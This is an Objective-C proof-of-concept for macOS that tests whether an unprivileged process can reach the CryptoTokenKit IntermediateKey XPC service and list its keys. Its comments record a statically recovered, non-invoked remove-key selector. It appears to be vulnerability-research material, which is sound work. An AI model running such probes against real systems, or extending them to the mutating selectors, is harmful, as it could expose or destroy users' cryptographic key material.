// READ-ONLY PoC (NOT EXECUTED) — confirms reachability of com.apple.CryptoTokenKit.IntermediateKey
// from an unprivileged uid=501 process and fires ONLY the non-mutating listIntermediateKeysWithReply:.
// Build:  clang -fobjc-arc -framework Foundation poc_list_readonly.m -o poc_list_readonly
// Run as uid=501 (NORMAL user). Does NOT call any remove/create/unlock selector.
//
// Statically-recovered protocol (from ctkahp __objc method type encodings, macOS 26A5368g):
//   listIntermediateKeysWithReply:  ->  v24@0:8@?<v@?@"NSArray"@"NSError">16
//        i.e. - (void)listIntermediateKeysWithReply:(void(^)(NSArray *, NSError *))reply;
//   (NOT used here) removeIntermediateKeyWithUserUuid:reply: -> v32@0:8@"NSUUID"16@?<v@?@"NSError">24
#import <Foundation/Foundation.h>

@protocol IKReadOnly <NSObject>
- (void)listIntermediateKeysWithReply:(void (^)(NSArray *keys, NSError *error))reply;
@end

int main(void) {
    @autoreleasepool {
        NSXPCConnection *c = [[NSXPCConnection alloc]
            initWithMachServiceName:@"com.apple.CryptoTokenKit.IntermediateKey" options:0];
        c.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(IKReadOnly)];
        __block BOOL invalidated = NO, interrupted = NO;
        c.invalidationHandler = ^{ invalidated = YES; NSLog(@"[poc] connection INVALIDATED (4099-class refuse)"); };
        c.interruptionHandler = ^{ interrupted = YES; NSLog(@"[poc] connection INTERRUPTED (4097)"); };
        [c resume];

        dispatch_semaphore_t s = dispatch_semaphore_create(0);
        id proxy = [c remoteObjectProxyWithErrorHandler:^(NSError *e){
            NSLog(@"[poc] proxy error: %@", e); dispatch_semaphore_signal(s); }];
        [proxy listIntermediateKeysWithReply:^(NSArray *keys, NSError *error){
            if (error) NSLog(@"[poc] list error: %@", error);
            else NSLog(@"[poc] ACCEPTED + reply delivered. count=%lu keys=%@",
                       (unsigned long)keys.count, keys);
            dispatch_semaphore_signal(s);
        }];
        dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, 5*NSEC_PER_SEC));
        NSLog(@"[poc] done. invalidated=%d interrupted=%d", invalidated, interrupted);
    }
    return 0;
}
